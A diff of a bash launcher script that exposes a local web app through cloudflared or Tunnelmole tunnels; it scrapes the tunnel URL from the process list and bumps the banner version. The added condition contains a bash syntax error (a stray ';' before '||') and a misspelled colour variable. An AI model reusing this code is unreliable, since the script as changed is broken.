@@ -11,9 +11,10 @@ cleanup() {
         killall cloudflared
         echo -e "${YELLOW}Cloudflared stopped.${RESET}"
     fi
-    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null; then
+    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null; || pgrep -f "x-www-browser" > /dev/null; then
         pkill -f "tunnelmole"
         pkill -f "tmole"
+        pkill -f "x-www-browser"
         echo -e "${YELLOW}Tunnelmole stopped.${RESET}"
     fi
     if pgrep -f "python3 web_app.py" > /dev/null; then
@@ -37,7 +38,7 @@ banner1() {
     echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
     echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
     echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
-    echo -e "                                                    V1.5\n"
+    echo -e "                                                    V2.0\n"
     echo -e "${RED}    "
 }
 
@@ -129,8 +130,22 @@ select_methode () {
             sleep 2
             clear
             banner1
-            echo -e "${YELLOW}Tunnelmole starting...."
-            tmole 8080
+            echo -e "${YELLOW}Tunnelmole starting....${GREEN}"
+            tmole 8080 &
+            sleep 2
+
+            result=$(ps aux | grep 'x-www-browser' | grep -o 'http[^ ]*')
+
+            if [[ -n "$result" ]]; then
+                echo -e "${YELLOW} \nURLs: "
+                echo -e "------------------------------------------------"
+                echo -e "${GREEN}$result ${YELLLOW}"
+                echo -e "------------------------------------------------"
+            else
+                echo -e "${RED}Error: Could not find Tunnelmole URL.${RESET}"
+                sleep 1
+                select_methode
+            fi
             ;;
 
         *)
@@ -138,6 +153,7 @@ select_methode () {
             sleep 1
             select_methode  
             ;;
+
     esac
 }
 
